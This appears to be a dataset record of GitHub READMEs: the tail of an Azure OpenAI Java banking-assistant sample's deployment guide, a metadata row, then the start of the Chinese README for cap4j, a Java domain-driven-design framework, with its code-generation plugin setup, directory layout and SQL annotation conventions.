All prerequisites are already installed in the container.  You can skip to the [Starting from scratch](#starting-from-scratch) section.

### Prerequisites

* [Java 17](https://learn.microsoft.com/en-us/java/openjdk/download#openjdk-17)
* [Maven 3.8.x](https://maven.apache.org/download.cgi)
* [Azure Developer CLI](https://aka.ms/azure-dev/install)
* [Node.js](https://nodejs.org/en/download/)
* [Git](https://git-scm.com/downloads)
* [Powershell 7+ (pwsh)](https://github.com/powershell/powershell) - For Windows users only.
  * **Important**: Ensure you can run `pwsh.exe` from a PowerShell command. If this fails, you likely need to upgrade PowerShell.


>[!WARNING] Your Azure Account must have `Microsoft.Authorization/roleAssignments/write` permissions, such as [User Access Administrator](https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#user-access-administrator) or [Owner](https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#owner).  

### Starting from scratch

You can clone this repo and change directory to the root of the repo. Or you can run `azd init -t Azure-Samples/agent-openai-java-banking-assistant`.

Once you have the project available locally, run the following commands if you don't have any pre-existing Azure services and want to start from a fresh deployment.

1. Run 

    ```shell
    azd auth login
    ```

2. Run 

    ```shell
    azd up
    ```
    
    * This will provision Azure resources and deploy this sample to those resources.
    * The project has been tested with gpt4-o-mini model which is currently available in these regions: **eastus** (Default), **swedencentral**.  For an up-to-date list of regions and models, check [here](https://learn.microsoft.com/en-us/azure/ai-services/openai/concepts/models)
    * The Azure Document Intelligence  new rest API is used which is currently available in these regions: **eastus**(Default), **westus2**, **westeurope**. More info [here](https://learn.microsoft.com/en-us/azure/ai-services/document-intelligence/sdk-overview-v4-0?view=doc-intel-4.0.0&tabs=csharp)

3. After the application has been successfully deployed you will see a web app URL printed to the console.  Click that URL to interact with the application in your browser.  

It will look like the following:

!['Output from running azd up'](docs/assets/azd-success.png)


### Deploying with existing Azure resources

If you already have existing Azure resources, you can re-use those by setting `azd` environment values.

#### Existing resource group

1. Run `azd env set AZURE_RESOURCE_GROUP {Name of existing resource group}`
2. Run `azd env set AZURE_LOCATION {Location of existing resource group (i.e eastus2)}`

#### Existing OpenAI resource

1. Run `azd env set AZURE_OPENAI_SERVICE {Name of existing OpenAI service}`
2. Run `azd env set AZURE_OPENAI_RESOURCE_GROUP {Name of existing resource group that OpenAI service is provisioned to}`
3. Run `azd env set AZURE_OPENAI_SERVICE_LOCATION {Location of existing resource (i.e eastus2)}`. Only needed if your OpenAI resource is in a different location than the one you'll pick for the `azd up` step.
4. Run `azd env set AZURE_OPENAI_CHATGPT_DEPLOYMENT {Name of existing ChatGPT deployment}`. Only needed if your ChatGPT deployment is not the default 'gpt4-o-mini'.

#### Existing Azure Document Intelligence

1. Run `azd env set AZURE_DOCUMENT_INTELLIGENCE_SERVICE {Name of existing Azure Document Intelligence}`
2. Run `azd env set AZURE_DOCUMENT_INTELLIGENCE_RESOURCE_GROUP {Name of existing resource group with Azure Document Intelligence service}`
3. If that resource group is in a different location than the one you'll pick for the `azd up` step,
   then run `azd env set AZURE_DOCUMENT_INTELLIGENCE_RESOURCE_GROUP_LOCATION {Location of existing service}`

#### Other existing Azure resources

You can also use existing Form Recognizer and Storage Accounts. See `./infra/main.parameters.json` for list of environment variables to pass to `azd env set` to configure those existing resources.

#### Provision remaining resources

Now you can run `azd up`, following the steps in [Deploying from scratch](#deploying-from-scratch) above.
That will both provision resources and deploy the code.


### Redeploying

If you've only changed the backend/frontend code in the `app` folder, then you don't need to re-provision the Azure resources. You can just run:

```shell
azd deploy
```

If you've changed the infrastructure files (`infra` folder or `azure.yaml`), then you'll need to re-provision the Azure resources. You can do that by running:

```shell
azd up
```
 > [!WARNING]
 > When you run `azd up` multiple times to redeploy infrastructure, make sure to set the following parameters in `infra/main.parameters.json` to `true` to avoid container apps images from being overridden with default ""mcr.microsoft.com/azuredocs/containerapps-helloworld"" image:

```json
 ""copilotAppExists"": {
      ""value"": false
    },
    ""webAppExists"": {
      ""value"": false
    },
    ""accountAppExists"": {
      ""value"": false
    },
    ""paymentAppExists"": {
      ""value"": false
    },
    ""transactionAppExists"": {
      ""value"": false
    }
```

### Running locally

1. Run

    ```shell
    az login
    ```

2. Change dir to `app`

    ```shell
    cd app
    ```

3. Run the `./start-compose.ps1` (Windows) or `./start-compose.sh` (Linux/Mac) scripts or run the ""VS Code Task: Start App"" to start the project locally.
4. Wait for the docker compose to start all the containers (web, api, indexer) and refresh your browser to [http://localhost](http://localhost)


## Guidance

### Testing different gpt4 models and versions
The default LLM used in this project is *gpt-4o-mini*. It's a cost-efficient small model with enhanced planning, reasoning capabilities which are required by this use case to reliably select the right agent based on the chat conversation and to properly handle tools call.However, in case of long chat or some words, the model might fail sometimes to detect the right user intent especially when he/she asks to pay a bill based on image upload. Based on our tests *gpt4-o* provides better results but it's more expensive and slower. To read more about the models and prices, check [here](https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/). 

You can test different models and versions by changing the , `AZURE_OPENAI_CHATGPT_MODEL`, `AZURE_OPENAI_CHATGPT_VERSION` and `AZURE_OPENAI_CHATGPT_DEPLOYMENT` environment variable to the desired model like below:

```shell
azd env set AZURE_OPENAI_CHATGPT_MODEL gpt-4o
azd env set AZURE_OPENAI_CHATGPT_VERSION 2024-05-13
azd env set AZURE_OPENAI_CHATGPT_DEPLOYMENT gpt-4o
```
### Enabling Application Insights

Applications Insights is enabled by default. It allows to investigate each request tracing along with the logging of errors.

If you want to disable it set the `AZURE_USE_APPLICATION_INSIGHTS` variable to false before running `azd up`

1. Run `azd env set AZURE_USE_APPLICATION_INSIGHTS false`
1. Run `azd up`

To see the performance data, go to the Application Insights resource in your resource group, click on the ""Investigate -> Performance"" blade and navigate to any HTTP request to see the timing data.
To inspect the performance of chat requests, use the ""Drill into Samples"" button to see end-to-end traces of all the API calls made for any chat request.
Under ""Trace & Events"" panel you can review custom Java informational logs to better understand content of OpenAI requests and responses.

![Tracing screenshot](docs/assets/transaction-tracing.png)

To see any exceptions and server errors, navigate to the ""Investigate -> Failures"" blade and use the filtering tools to locate a specific exception. You can see Java stack traces on the right-hand side.

### Enabling authentication

By default, the web app on ACA will have no authentication or access restrictions enabled, meaning anyone with routable network access to the web app can chat with your personal assistant.You can require authentication to your Microsoft Entra by following the [Add app authentication](https://learn.microsoft.com/en-us/azure/container-apps/authentication) tutorial and set it up against the deployed web app.


To then limit access to a specific set of users or groups, you can follow the steps from [Restrict your Microsoft Entra app to a set of users](https://learn.microsoft.com/entra/identity-platform/howto-restrict-your-app-to-a-set-of-users) by changing ""Assignment Required?"" option under the Enterprise Application, and then assigning users/groups access.  Users not granted explicit access will receive the error message -AADSTS50105: Your administrator has configured the application <app_name> to block users 

### App Continuous Integration with GitHub Actions

1. **Create a Service Principal for the github action pipeline**

    Use [az ad sp create-for-rbac](https://learn.microsoft.com/en-us/cli/azure/ad/sp#az_ad_sp_create_for_rbac) to create the service principal:
    
    ```bash
    groupId=$(az group show --name <resource-group-name>  --query id --output tsv)
    az ad sp create-for-rbac --name ""agent-openai-java-banking-assistant-pipeline-spi"" --role contributor --scope $groupId --sdk-auth
    ```
    Output is similar to:
    
    ```json
    {
    ""clientId"": ""xxxx6ddc-xxxx-xxxx-xxx-ef78a99dxxxx"",
    ""clientSecret"": ""xxxx79dc-xxxx-xxxx-xxxx-aaaaaec5xxxx"",
    ""subscriptionId"": ""xxxx251c-xxxx-xxxx-xxxx-bf99a306xxxx"",
    ""tenantId"": ""xxxx88bf-xxxx-xxxx-xxxx-2d7cd011xxxx"",
    ""activeDirectoryEndpointUrl"": ""https://login.microsoftonline.com"",
    ""resourceManagerEndpointUrl"": ""https://management.azure.com/"",
    ""activeDirectoryGraphResourceId"": ""https://graph.windows.net/"",
    ""sqlManagementEndpointUrl"": ""https://management.core.windows.net:8443/"",
    ""galleryEndpointUrl"": ""https://gallery.azure.com/"",
    ""managementEndpointUrl"": ""https://management.core.windows.net/""
    } 
    ```
    
    Save the JSON output because it is used in a later step. Also, take note of the clientId, which you need to update the service principal in the next section.

2. **Assign ACRPush permission to service Principal**
   
   This step enables the GitHub workflow to use the service principal to [authenticate with your container registry](https://learn.microsoft.com/en-us/azure/container-registry/container-registry-auth-service-principal) and to push a Docker image.
   Get the resource ID of your container registry. Substitute the name of your registry in the following az acr show command:
   ```bash
   registryId=$(az acr show --name <registry-name> --resource-group <resource-group-name> --query id --output tsv)
    ```

   Use [az role assignment create](https://learn.microsoft.com/en-us/cli/azure/role/assignment#az_role_assignment_create) to assign the AcrPush role, which gives push and pull access to the registry. Substitute the client ID of your service principal:
   ```bash
   az role assignment create --assignee <ClientId> --scope $registryId --role AcrPush
   ```

3. **Add the service principal to your GitHub environment secrets**

 - Go to your forked repository in GitHub and create an [environment]((https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment)) called 'Development' (yes this is the exact name; don't change it). If you want to change the environment name (also adding new branches and environments, change the current branch/env mapping) you can do that, but make sure to change the pipeline code accordingly in `.github/workflows/azure-dev.yml`.
 - Create 'Development' environment [secrets](https://docs.github.com/en/actions/security-guides/encrypted-secrets#creating-encrypted-secrets-for-a-repository) as below:
    | Secret                | Value                                                                                      |
    |-----------------------|--------------------------------------------------------------------------------------------|
    | AZURE_CREDENTIALS     | The entire JSON output from the service principal creation step                            |
    | SPI_CLIENT_ID         | The service principal client id used as username to login to Azure Container Registry      |
    | SPI_CLIENT_SECRET     | The service principal client secret used as password to login to Azure Container Registry  |
 - Create 'Development' [environment variables](https://docs.github.com/en/actions/learn-github-actions/variables#creating-configuration-variables-for-an-environment) as below:
    | Variable                | Value                                                                                        |
    |---------------------------|--------------------------------------------------------------------------------------------|
    | ACR_NAME                  | The name of the Azure Container registry                                                   |
    | RESOURCE_GROUP            | The name of the resource group where your Azure Container Environment has been deployed    |
 - Create [repository variables](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables#creating-configuration-variables-for-a-repository) as below:
    | Variable                | Value                                                                                        |
    |---------------------------|--------------------------------------------------------------------------------------------|
    | ACA_DEV_ENV_NAME                  | The name of the Azure Container Apps Environment                                       |
    | COPILOT_ACA_DEV_APP_NAME      | The container app name for the copilot orchestrator app                                    |
    | WEB_ACA_DEV_APP_NAME          | The container app name for the web frontend  app                                           |
    | ACCOUNTS_ACA_DEV_APP_NAME     | The container app name for the business account api                                        |
    | PAYMENTS_ACA_DEV_APP_NAME     | The container app name for the business payment api                                        |
    | TRANSACTIONS_ACA_DEV_APP_NAME | The container app name for the business payment api                                        |


### Cost estimation

Pricing varies per region and usage, so it isn't possible to predict exact costs for your usage.
However, you can try the [Azure pricing calculator](https://azure.com/e/8ffbe5b1919c4c72aed89b022294df76) for the resources below.

- Azure Containers App: Consumption workload profile with 4 CPU core and 8 GB RAM. Pricing per vCPU and Memory. [Pricing](https://azure.microsoft.com/en-us/pricing/details/container-apps/)
- Azure OpenAI: Standard tier, ChatGPT and Ada models. Pricing per 1K tokens used, and at least 1K tokens are used per question. [Pricing](https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/)
- Azure Document Intelligence: SO (Standard) tier using pre-built layout. [Pricing](https://azure.microsoft.com/pricing/details/form-recognizer/)

- Azure Blob Storage: Standard tier with ZRS (Zone-redundant storage). Pricing per storage and read operations. [Pricing](https://azure.microsoft.com/pricing/details/storage/blobs/)
- Azure Monitor: Pay-as-you-go tier. Costs based on data ingested. [Pricing](https://azure.microsoft.com/pricing/details/monitor/)

The first 180,000 vCPU-seconds, 360,000 GiB-seconds, and 2 million requests each month are free for ACA. To reduce costs, you can switch to free SKUs Document Intelligence by changing the parameters file under the `infra` folder. There are some limits to consider; for example, the free resource only analyzes the first 2 pages of each document. 

⚠️ To avoid unnecessary costs, remember to take down your app if it's no longer in use,
either by deleting the resource group in the Portal or running `azd down`.


## Resources

Here are some resources to learn more about multi-agent architectures and technologies used in this sample:

- [Generative AI For Beginners](https://github.com/microsoft/generative-ai-for-beginners)
- [Azure OpenAI Service](https://learn.microsoft.com/azure/ai-services/openai/overview)
- [Semantic Kernel for Java](https://devblogs.microsoft.com/semantic-kernel/java-1-0-release-candidate-for-semantic-kernel-now-available/)
- [OpenAI's Bet on a Cognitive Architecture](https://blog.langchain.dev/openais-bet-on-a-cognitive-architecture/)
- [THE LANDSCAPE OF EMERGING AI AGENT ARCHITECTURES FOR REASONING, PLANNING, AND TOOL CALLING: A SURVEY](https://arxiv.org/pdf/2404.11584)
- [MicroAgents: Exploring Agentic Architecture with Microservices](https://devblogs.microsoft.com/semantic-kernel/microagents-exploring-agentic-architecture-with-microservices/)
- [Chat + Enterprise data with Azure OpenAI and Azure AI Search](https://github.com/Azure-Samples/azure-search-openai-java)
- [SK Agents Overview and High Level Design (.net)](https://github.com/microsoft/semantic-kernel/blob/ec26ce7cb70f933b52a62f0a4e1c7b98c49d590e/docs/decisions/0032-agents.md#usage-patterns)

You can also find [more Azure AI samples here](https://github.com/Azure-Samples/azureai-samples).

## FAQ

You can find answers to frequently asked questions in the [FAQ](./docs/faq.md).

## Troubleshooting

If you have any issue when running or deploying this sample, please check the [troubleshooting guide](./docs/troubleshooting.md). If you can't find a solution to your problem, please [open an issue](https://github.com/Azure-Samples/agent-openai-java-banking-assistant/issues) in this repository.

## Contributing

This project welcomes contributions and suggestions. Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit https://cla.opensource.microsoft.com.

When you submit a pull request, a CLA bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.

This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or
contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.

## Trademarks

This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft
trademarks or logos is subject to and must follow
[Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).
Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.
Any use of third-party trademarks or logos are subject to those third-party's policies.
",0,0,4,1.0,"['multi', 'agent', 'bank', 'assistant', 'java', 'semantic', 'kernel', 'overview', 'feature', 'architecture', 'get', 'start', 'run', 'github', 'codespaces', 'v', 'code', 'dev', 'container', 'prerequisite', 'start', 'scratch', 'deploy', 'exist', 'azure', 'resource', 'exist', 'resource', 'group', 'exist', 'openai', 'resource', 'exist', 'azure', 'document', 'intelligence', 'other', 'exist', 'azure', 'resource', 'provision', 'remain', 'resource', 'redeploy', 'run', 'locally', 'guidance', 'test', 'different', 'model', 'version', 'enable', 'application', 'insight', 'enable', 'authentication', 'app', 'continuous', 'integration', 'github', 'action', 'cost', 'estimation', 'resource', 'faq', 'troubleshoot', 'contribute', 'trademark']","['resource', 'exist', 'azure', 'start', 'run']",6.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.spotbugs:spotbugs-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.codehaus.mojo:animal-sniffer-maven-plugin,org.codehaus.mojo:exec-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,5.0,1.0
netcorepal/cap4j,main,"# cap4j

[![Maven Central Version](https://img.shields.io/maven-central/v/io.github.netcorepal/cap4j)](https://central.sonatype.com/artifact/io.github.netcorepal/cap4j)
[![GitHub license](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/netcorepal/cap4j/blob/main/LICENSE)

本项目是 [CAP](https://github.com/dotnetcore/CAP) 项目的 Java 实现，基于[整洁架构](https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html)、`领域模型`、`Outbox`模式、`CQS`模式以及`UoW`模式等理念，cap4j期望解决如何`实现领域驱动设计`的问题。

如果对以上架构理念有充分了解，那么cap4j的使用将会非常顺手。另一方面，通过cap4j来构建你的服务，你将学会一种实现领域驱动设计的完整落地方法。

## 快速开始

### 脚手架搭建
#### **第一步**：新建一个空的maven项目
> 定好maven坐标三要素：`groupId`、`artifactId`、`version`

#### **第二步**：修改pom.xml
> 在pom.xml中添加`cap4j-ddd-codegen-maven-plugin`插件。
```xml
<project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"">
    <modelVersion>4.0.0</modelVersion>

    <groupId>io.github.netcorepal</groupId>
    <artifactId>cap4j-ddd-mvc-example</artifactId>
    <version>1.0-SNAPSHOT</version>
    <packaging>jar</packaging>

    <name>cap4j-ddd-mvc-example</name>
    <dependencies>
        <dependency>
            <groupId>io.github.netcorepal</groupId>
            <artifactId>cap4j-ddd-codegen-maven-plugin</artifactId>
            <version>1.0.0-alpha-1</version>
            <scope>provided</scope>
        </dependency>
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <groupId>io.github.netcorepal</groupId>
                <artifactId>cap4j-ddd-codegen-maven-plugin</artifactId>
                <version>1.0.0-alpha-1</version>
                <configuration>
                    <archTemplate>https://raw.githubusercontent.com/netcorepal/cap4j/main/cap4j-ddd-codegen-template.json</archTemplate>
                    <basePackage>org.netcorepal.cap4j.ddd.example</basePackage>
                    <multiModule>false</multiModule>
                    <moduleNameSuffix4Adapter>-adapter</moduleNameSuffix4Adapter>
                    <moduleNameSuffix4Domain>-domain</moduleNameSuffix4Domain>
                    <moduleNameSuffix4Application>-application</moduleNameSuffix4Application>
                    <connectionString>
                        <![CDATA[jdbc:mysql://127.0.0.1:3306/test?serverTimezone=Asia/Shanghai&useSSL=false&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull]]>
                    </connectionString>
                    <user>root</user>
                    <pwd>123456</pwd>
                    <schema>test</schema>
                    <table></table>
                    <ignoreTable></ignoreTable>
                    <idField>id</idField>
                    <versionField>version</versionField>
                    <deletedField>db_deleted</deletedField>
                    <readonlyFields>db_created_at,db_updated_at</readonlyFields>
                    <ignoreFields></ignoreFields>
                    <entityBaseClass></entityBaseClass>
                    <entityMetaInfoClassOutputMode>ref</entityMetaInfoClassOutputMode>
                    <entityMetaInfoClassOutputPackage>domain._share.meta</entityMetaInfoClassOutputPackage>
                    <fetchMode>SUBSELECT</fetchMode>
                    <fetchType>EAGER</fetchType>
                    <idGenerator>org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator</idGenerator>
                    <enumValueField>code</enumValueField>
                    <enumNameField>name</enumNameField>
                    <enumUnmatchedThrowException>true</enumUnmatchedThrowException>
                    <datePackage4Java>java.time</datePackage4Java>
                    <typeRemapping></typeRemapping>
                    <generateDefault>false</generateDefault>
                    <generateDbType>true</generateDbType>
                    <generateSchema>true</generateSchema>
                    <generateBuild>false</generateBuild>
                    <aggregateIdentityClass>Long</aggregateIdentityClass>
                    <aggregateRootAnnotation></aggregateRootAnnotation>
                    <aggregateRepositoryBaseClass></aggregateRepositoryBaseClass>
                    <aggregateRepositoryCustomerCode></aggregateRepositoryCustomerCode>
                    <ignoreAggregateRoots></ignoreAggregateRoots>
                </configuration>
            </plugin>
        </plugins>
    </build>
</project>
```
通常，`cap4j-ddd-codegen`插件只需要我们根据团队或项目的实际情况调整以下配置项即可使用。
> - `basePackage`: 项目基础包名，一般为com.yourcompany.project
> - `connectionString`: 数据库连接串
> - `user`: 数据库账号
> - `pwd`: 数据库密码
> - `schema`: 数据库名称


#### **第三步**：执行插件命令，生成项目脚手架
> 插件配置项`archTemplate`是`gen-arch`命令生成脚手架目录与项目基础代码的配置文件地址。开放自定义方便大家根据自己团队需求进行定制化。格式说明后续再，不过格式很简单，按示例中的配置自己应该就能看懂并应用。有兴趣更详细了解的参考源码[GenArchMojo](cap4j-ddd-codegen-maven-plugin/src/main/java/org/netcorepal/cap4j/ddd/codegen/GenArchMojo.java)

```shell
mvn cap4j-ddd-codegen:gen-arch
```
如果没有意外，项目结构通过`cap4j-ddd-codegen`插件已初始化完毕！

### 目录结构介绍
#### 简介
```xml
<basePackage>org.netcorepal.cap4j.ddd.example</basePackage> 
```
基于基础包路径配置，在maven项目源码目录`src/main/java/org/netcorepal/cap4j/ddd/example`下将会生成4个`package`。
> - `_share`       公共代码
> - `adapter`      适配层(Interface Adapter)
> - `application`  应用层(Application Business Rules)
> - `domain`       领域层(Enterpprise Business Rules)

以上代码分层完全遵循[整洁架构](https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html)对于代码分层组织的观点。
![整洁架构](https://blog.cleancoder.com/uncle-bob/images/2012-08-13-the-clean-architecture/CleanArchitecture.jpg)

#### 领域层
实现领域模型，聚合、实体、领域事件以及集成事件定义。
```text
└── org.netcorepal.cap4j.ddd.example
    └── domain
        ├── _share (领域层公共代码，仅供领域层引用)
        ├── aggregates (实体聚合声明)
        └── services (领域服务)
```

#### 应用层
实现`CQS`模式，将功能用例(`UseCase`)抽象成命令或查询来实现。
```text
└── org.netcorepal.cap4j.ddd.example
    └── application
        ├── _share (应用层公共代码，仅供领域层引用)
        │   ├── clients (防腐层：包装三方服务调用接口)
        │   ├── enums (应用层枚举类型)
        │   └── events (声明三方服务集成事件)
        ├── commands (CQS的C：命令)
        ├── queries (CQS的Q：查询)
        └── subscribers (领域事件或集成事件的订阅处理逻辑)
```

#### 适配层
如适配字面意思，放置各层（领域层`domain`、应用层`application`）定义的接口实现。整洁架构中称其为接口适配层（`Interface Adapters`）。

该层是领域层和应用层业务逻辑所依赖的`抽象功能接口`的技术适配实现，遵循DI原则。

举个例子来理解抽象功能接口，比如我们常见的电商场景，用户在商城下单，需要通知仓库打包发货。那么这个`通知`可能就会需要抽象出一个`通知功能接口`，来承接下单流程的连续性。至此，通知功能接口的定义都是应用层关心的事。但是通知功能接口如何实现，就是适配层的事了，你是短信也好、电话也好，能够实现通知功能接口定义的核心效果即可。

```text
└── org.netcorepal.cap4j.ddd.example
    └── adapter
        ├── _share (适配层公共代码，仅供适配层引用)
        │   └── configure
        │       └── ApolloConfig.java (配置中心)
        ├── application (应用层接口实现)
        │   ├── _share
        │   └── clients
        ├── domain (领域层接口实现)
        │   ├── _share
        │   │   └── configure
        │   │       └── MyDomainEventMessageInterceptor.java (集成事件消息拦截器)
        │   └── repositories (实现聚合仓储接口)
        ├── infra (基础设施适配接口实现）
        │   ├── _share
        │   ├── jdbc (服务于应用层CQS的Q，jdbc查询工具类)
        │   │   └── NamedParameterJdbcTemplateDao.java
        │   └── mybatis (服务于应用层CQS的Q，mybatis集成） 
        │       ├── _share
        │       │   └── MyEnumTypeHandler.java
        │       └── mapper
        └── portal (端口)
            ├── api (SpringMVC相关代码)
            │   ├── TestController.java
            │   └── _share
            │       ├── ResponseData.java
            │       ├── Status.java
            │       └── configure
            │           ├── CommonExceptionHandler.java
            │           ├── MvcConfig.java
            │           └── SwaggerConfig.java
            ├── jobs (定时任务相关代码）
            │   └── _share
            │       └── configure
            │           └── XxlJobConfig.java
            └── queues (消息队列相关代码）
```

#### 公共代码
放置公共代码。
```text
└── org.netcorepal.cap4j.ddd.example
    └── _share
        ├── CodeEnum.java  (响应状态码枚举)
        ├── Constants.java (公共常量)
        └── exception (自定义业务异常)
            ├── ErrorException.java
            ├── KnownException.java
            └── WarnException.java
```

#### 项目目录树
```text
.
├── pom.xml
└── src
    ├── main
    │   ├── java
    │   │   └── org
    │   │       └── netcorepal
    │   │           └── cap4j
    │   │               └── ddd
    │   │                   └── example
    │   │                       ├── StartApplication.java
    │   │                       ├── _share
    │   │                       │   ├── CodeEnum.java
    │   │                       │   ├── Constants.java
    │   │                       │   └── exception
    │   │                       │       ├── ErrorException.java
    │   │                       │       ├── KnownException.java
    │   │                       │       └── WarnException.java
    │   │                       ├── adapter
    │   │                       │   ├── _share
    │   │                       │   │   └── configure
    │   │                       │   │       └── ApolloConfig.java
    │   │                       │   ├── application
    │   │                       │   │   ├── _share
    │   │                       │   │   └── clients
    │   │                       │   ├── domain
    │   │                       │   │   ├── _share
    │   │                       │   │   │   └── configure
    │   │                       │   │   │       └── MyDomainEventMessageInterceptor.java
    │   │                       │   │   └── repositories
    │   │                       │   ├── infra
    │   │                       │   │   ├── _share
    │   │                       │   │   ├── jdbc
    │   │                       │   │   │   └── NamedParameterJdbcTemplateDao.java
    │   │                       │   │   └── mybatis
    │   │                       │   │       ├── _share
    │   │                       │   │       │   └── MyEnumTypeHandler.java
    │   │                       │   │       └── mapper
    │   │                       │   └── portal
    │   │                       │       ├── api
    │   │                       │       │   ├── TestController.java
    │   │                       │       │   └── _share
    │   │                       │       │       ├── ResponseData.java
    │   │                       │       │       ├── Status.java
    │   │                       │       │       └── configure
    │   │                       │       │           ├── CommonExceptionHandler.java
    │   │                       │       │           ├── MvcConfig.java
    │   │                       │       │           └── SwaggerConfig.java
    │   │                       │       ├── jobs
    │   │                       │       │   └── _share
    │   │                       │       │       └── configure
    │   │                       │       │           └── XxlJobConfig.java
    │   │                       │       └── queues
    │   │                       ├── application
    │   │                       │   ├── _share
    │   │                       │   │   ├── clients
    │   │                       │   │   ├── enums
    │   │                       │   │   └── events
    │   │                       │   ├── commands
    │   │                       │   ├── queries
    │   │                       │   └── subscribers
    │   │                       └── domain
    │   │                           ├── _share
    │   │                           ├── aggregates
    │   │                           └── services
    │   └── resources
    │       ├── mapper
    │       ├── application.properties
    │       ├── ddl.sql
    │       └── logback.xml
    └── test
        └── java
            └── org
                └── netcorepal
                    └── cap4j
                        └── ddd
                            └── example
                                └── AppTest.java
```

### 编码最佳实践

#### 领域层
##### ORM代码生成
根据领域模型中的实体以及聚合关系，完成数据库表设计。

为了方便实体到数据库表映射的枯燥工作（ORM），我们设计了一套基于数据库注释的注解语法，并且这套语法非常简单。
通常情况下（比如都是单实体聚合的领域模型）我们不需要这些注解语法也可以让实体代码生成正常工作。

大部分情况下，我们也只需要熟悉一个表注解和两个列注解即可：
- 表注解 `@P`=_root_entity_table_;
- 列注解 `@T`=_JavaType_; `@E`=_0_:_ENUM_FIELD_:_枚举字段注释_;

```sql
CREATE TABLE `order` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `order_no` varchar(100) NOT NULL DEFAULT '' COMMENT '订单编号',
  `order_status` int unsigned NOT NULL DEFAULT '0' COMMENT '订单状态@T=OrderStatus;@E=0:INIT:待支付|1:PAID:已支付|-1:CLOSED:已关闭;',
  `amount` decimal(14,2) NOT NULL DEFAULT '0.00' COMMENT '总金额',
  `version` bigint unsigned NOT NULL DEFAULT '0',
  `db_created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `db_updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  `db_deleted` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_db_created_at` (`db_created_at`),
  KEY `idx_db_updated_at` (`db_updated_at`)
) COMMENT='订单\n';

CREATE TABLE `order_item` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `order_id` bigint NOT NULL DEFAULT '0' COMMENT '关联主订单',
  `name` varchar(100) NOT NULL DEFAULT '' COMMENT '名称',
  `price` decimal(14,2) NOT NULL DEFAULT '0.00' COMMENT '单价',
  `count` int NOT NULL DEFAULT '0' COMMENT '数量',
  `version` bigint unsigned NOT NULL DEFAULT '0',
  `db_created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `db_updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  `db_deleted` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_db_created_at` (`db_created_at`),
  KEY `idx_db_updated_at` (`db_updated_at`)
) COMMENT='订单项\n @P=order';
# 以上sql语句隐含了如下实体映射关系：
# 订单表(order)对应实体是一个聚合根，并且订单项表(order_item)对应实体是order聚合的实体成员。
# 订单表(order)的订单状态字段(order_status)将会映射成OrderStatus的Java类型，该OrderStatus是一个enum类型，有3个字段成员，INIT、PAID、CLOSED
```
默认情况下，所有数据库表都将会映射成一个Java实体类，该实体类将构成一个聚合，并且作为该聚合的聚合根。如果聚合存在其他实体，则其他实体对应的表注释标注@P注解即可。

> @P指示该表对应的Java实体类属于某个聚合内的实体成员。
> 
> @E负责生成OrderStatus枚举。@E需要配合@T才能完成数据库字段的Java枚举映射。
> 
> @T负责将Order实体的orderStatus字段映射成OrderStatus枚举，@T可以单独工作，用于DB类型<->Java类型的强制自定义映射。
> 
> 如果想要对这套语法有个详细完整的了解，可以通过如下maven指令获取语法帮助。
> ```shell
> mvn io.github.netcorepal:cap4j-ddd-codegen-maven-plugin:1.0.0-alpha-1:help
> # or
> mvn cap4j-ddd-codegen:help
> ```
> 需要注意的是，当前`cap4j-ddd-codegen:gen-entity`仅支持基于MySQL数据库注释的注解解析。

先后执行
```shell
mvn cap4j-ddd-codegen:gen-entity
mvn cap4j-ddd-codegen:gen-repository
```
代码生成结果
```java
package org.netcorepal.cap4j.ddd.example.domain.aggregates;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Getter;
import lombok.NoArgsConstructor;
import org.hibernate.annotations.GenericGenerator;
import org.hibernate.annotations.DynamicInsert;
import org.hibernate.annotations.DynamicUpdate;
import org.hibernate.annotations.Fetch;
import org.hibernate.annotations.FetchMode;
import org.hibernate.annotations.SQLDelete;
import org.hibernate.annotations.Where;

import javax.persistence.*;

/**
 * 订单
 *
 * 本文件由[cap4j-ddd-codegen-maven-plugin]生成
